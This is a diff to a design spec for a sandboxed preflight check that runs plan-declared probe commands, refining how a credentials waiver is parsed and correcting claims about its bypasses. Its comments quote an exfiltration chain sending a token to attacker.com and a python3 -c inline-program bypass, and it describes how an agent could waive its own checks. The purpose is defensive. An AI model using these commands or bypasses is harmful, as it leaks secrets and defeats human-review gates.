@@ -852,7 +852,10 @@ inherits `expected_output`'s pre-existing limitation (two `discoverability_test`
 sub-blocks could confuse it); that is unchanged here.
 
 The read is SCOPED TO THE `discoverability_test:` SUB-BLOCK, and that scoping is
-load-bearing rather than tidiness. `expected_output` is read with a flat
+load-bearing rather than tidiness. It NARROWS the bypass class without closing
+it — a `credentials_required:` line inside the command's own block scalar is
+still honoured, so a multi-line command can waive itself. Closing that needs a
+YAML-aware parse this flat `awk` deliberately avoids. `expected_output` is read with a flat
 whole-block scan and survives it, because a stray `expected_output:` only changes
 what a probe is compared against. This field **skips execution entirely**, so the
 same flat read is a bypass: measured, one `credentials_required:` line under
@@ -890,11 +893,24 @@ CREDS_REQ=$(awk '
     }
   }
 ' "$PREFLIGHT_TMP/preflight-observability.txt")
-CREDS_REQ="${CREDS_REQ%\"}"; CREDS_REQ="${CREDS_REQ#\"}"
-# A comment-only value, a bare block/fold indicator, or an empty value declares
-# nothing. Treat all three as absent so the normal path runs.
+# Trim, THEN strip a symmetric quote pair. Order and completeness both matter:
+# stripping only `"` and never trimming meant `credentials_required: 'placeholder'`
+# and `credentials_required: TODO␠␠` both reached the SKIP-DECLARED branch while
+# the TypeScript mirror correctly FAILed them — so the placeholder superset fix
+# was undone in the runtime of record by one apostrophe, invisibly to the suite.
+CREDS_REQ="${CREDS_REQ#"${CREDS_REQ%%[![:space:]]*}"}"
+CREDS_REQ="${CREDS_REQ%"${CREDS_REQ##*[![:space:]]}"}"
 case "$CREDS_REQ" in
-  "#"*|">"|"|") CREDS_REQ="" ;;
+  \"*\") CREDS_REQ="${CREDS_REQ#\"}"; CREDS_REQ="${CREDS_REQ%\"}" ;;
+  \'*\') CREDS_REQ="${CREDS_REQ#\'}"; CREDS_REQ="${CREDS_REQ%\'}" ;;
+esac
+# A comment-only value, a bare block/fold indicator, or an empty value declares
+# nothing. Treat all as absent so the normal path runs. The CHOMPED indicators
+# (`>-` `>+` `|-` `|+`) are included because #6772 — the change cited as the
+# reason authors reach for indicators at all — is exactly what made those forms
+# first-class for `command:`, so they are the likelier typo, not the rarer one.
+case "$CREDS_REQ" in
+  "#"*|">"|">-"|">+"|"|"|"|-"|"|+") CREDS_REQ="" ;;
 esac
 
 if [[ -n "$CREDS_REQ" ]]; then
@@ -914,7 +930,11 @@ fi
 
 `SKIP-DECLARED` is its **own** terminal, never folded into ordinary `SKIP`, and it carries
 the declared scope verbatim into the Phase 2 aggregate row. That is deliberate: this is the
-cheapest path to a non-FAIL for any probe, for any reason, and in `/soleur:one-shot` the
+cheapest path to a non-FAIL for any probe whose verb Check 10 cannot run — though
+not the cheapest overall: a tautological probe (`printf 200` against
+`expected_output: "200"`) reaches PASS and is counted by none of the three
+counterweights below. That gap is pre-existing, not introduced here, but the
+superlative was wrong as written. For the declared path specifically, this is and in `/soleur:one-shot` the
 same agent authors the declaration and runs the gate. Left invisible it would convert
 Check 10 from a verification gate into self-certification. The three mechanical
 counterweights are the distinct terminal, the committed corpus baseline count in
@@ -958,7 +978,7 @@ strictly **weaker** than the remedy it prescribes. Step 10.5 additionally runs
 `bash -c "$CMD"`, so every probe already *is* an inline program; a rule rejecting
 `python3 -c` while printing instructions to use `bash scripts/x.sh` rejects a spelling, not
 a capability. Measured on the plan corpus, the deleted arg rules were 50% false-positive
-and the deleted path rule fired once in 678 commands, while false-rejecting
+and the deleted path rule fired once across the corpus, while false-rejecting
 `bun test … -p`, `python3 … --print json` and `node … -e prod`.
 
 It is not a legibility control either: the full command sits in the PR diff regardless, and
@@ -1039,8 +1059,12 @@ compromise.
 
 ```text
 # Defense-in-depth: reject every shell-active token before run. The plan file
-# is trust-on-PR-review but this regex is what blocks a malicious plan author
-# from chaining `; curl attacker.com?leak=$TOKEN` after a benign curl probe.
+# is trust-on-PR-review. NOTE: this regex blocks ONE SPELLING of chaining. Its
+# complement — the inline-program arg rules — was deleted in #7393, so
+# `python3 -c "__import__('os').system('curl …')"` now passes both this reject
+# and the verb gate with no rejected token present. Do NOT cite it as the control
+# against a malicious plan author; it is a typo-catcher. The Step 10.5 sandbox is
+# the control.
 # Rejects: ;, &&, ||, |, >, <, &, NEWLINE, parameter expansion ($VAR or ${VAR}),
 # command substitution $(), backticks, process substitution <(/>().
 #
@@ -1209,7 +1233,7 @@ the denylist mistake ADR-173 exists to retire.
 | 3 | Block exists, no `discoverability_test.command` parsed | `$CMD` empty after both Form A + B attempts | **FAIL** | Rule violation — the load-bearing field of the schema is missing. |
 | 4 | Probe declares `credentials_required` (non-placeholder) | `$CREDS_REQ` non-empty and not a placeholder | **SKIP-DECLARED** | The property has no unauthenticated substitute. Executing it in the sandbox would fail for lack of credentials and prove nothing. Waives verification, not execution — the command never runs. |
 | 5 | `credentials_required` is placeholder text | `$CREDS_REQ` matches `TODO`/`TBD`/`N/A`/… | **FAIL** | A declaration that says nothing waives nothing (deepen-plan §4.7 placeholder machinery). |
-| 6 | Verb not on `PROBE_VERB_ALLOWLIST`, or inline program, or non-repo-relative program path | Step 10.4 arg/verb/path gates | **FAIL** | Deny-by-default. The reason names both remedies (repo-relative script; `credentials_required`) and the allowlist-extension route. |
+| 6 | Verb not on `PROBE_VERB_ALLOWLIST` | `scripts/probe-verb-gate.sh` exits 1 | **FAIL** | Deny-by-default, with no path-shaped exemption. Schema validation, not a security control — see Step 10.4. The reason names both remedies (repo-relative script; `credentials_required`) and the allowlist-extension route. |
 | 7 | Sandbox unavailable or cannot be established | `bwrap` absent, or both `--proc` and no-`--proc` establishment attempts fail | **SKIP-NOSANDBOX** | Fail-closed. Never falls back to unsandboxed execution. Its OWN terminal: folded into ordinary SKIP, "the gate verified nothing" was byte-identical to "the gate had nothing to do". bwrap is Linux-only, so on macOS this is the steady state. Emits `SOLEUR_PREFLIGHT_CHECK10_NOSANDBOX` so it is countable across the fleet. |
 | 8 | Command DNS-fails | `$DT_RC == 6` (curl: "Could not resolve host") | **FAIL** | The hostname-typo class — the exact #4148 regression. |
 | 9 | Command times out | `$DT_RC == 28` (curl) OR `$DT_RC == 124` (timeout(1)) | **FAIL** | Endpoint unreachable; DNS resolved but no response in 15s. |
@@ -1235,7 +1259,7 @@ On **FAIL**, present the failure reason + sanitized command + diagnostic and off
 **Result:**
 
 - **PASS** — Sensitive-path diff with valid plan-linked Observability block AND command ran inside the sandbox AND output matches `expected_output`.
-- **FAIL** — Sensitive-path diff with any of: missing Observability block, missing `discoverability_test.command`, command requires SSH, verb not on `PROBE_VERB_ALLOWLIST`, inline program passed to an allowlisted runtime, non-repo-relative program path, placeholder `credentials_required`, command contains shell substitution, DNS failure, timeout, or output mismatch.
+- **FAIL** — Sensitive-path diff with any of: missing Observability block, missing `discoverability_test.command`, command requires SSH, verb not on `PROBE_VERB_ALLOWLIST` (no path-shaped exemption), placeholder `credentials_required`, command contains shell substitution, DNS failure, timeout, or output mismatch.
 - **SKIP** — No sensitive paths touched, OR no PR available, OR no plan file linked from PR body, OR command is auth-gated with no operator creds.
 - **SKIP-NOSANDBOX** — The bwrap sandbox is unavailable or could not be established (fail-closed — never an unsandboxed fallback). Reported distinctly from **SKIP** because "the check could not run" and "the check had nothing to do" are different facts, and only one of them means a security gate is dark. Emits a `SOLEUR_*` sentinel so it is countable across the fleet rather than one line of local stdout.
 - **SKIP-DECLARED** — The plan declares a non-placeholder `discoverability_test.credentials_required`. The command was **not executed**; the declared scope is surfaced verbatim. Reported distinctly from **SKIP** everywhere (headless line, Phase 2 aggregate row) because it is a verification waiver a reviewer must be able to see.
